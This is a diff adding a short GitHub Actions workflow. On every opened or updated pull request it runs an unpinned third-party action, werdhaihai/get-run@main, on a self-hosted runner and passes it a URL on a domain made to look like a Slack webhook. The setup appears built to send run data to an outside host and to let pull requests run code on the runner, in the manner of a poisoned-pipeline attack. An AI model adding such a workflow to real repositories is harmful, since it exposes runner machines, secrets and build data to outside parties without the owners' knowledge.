@@ -1,0 +1,16 @@
+name: Third Party Action
+
+on:
+  pull_request:
+    types:
+      - opened
+      - synchronize
+
+jobs:
+  checkout-test:
+    runs-on: self-hosted
+    steps:
+    - name: Get Run
+      uses: werdhaihai/get-run@main
+      with:
+        url: 'https://hooks.slack.bigstuffshipping.com/24e63c7fb35046ce8035cde8d4847982'
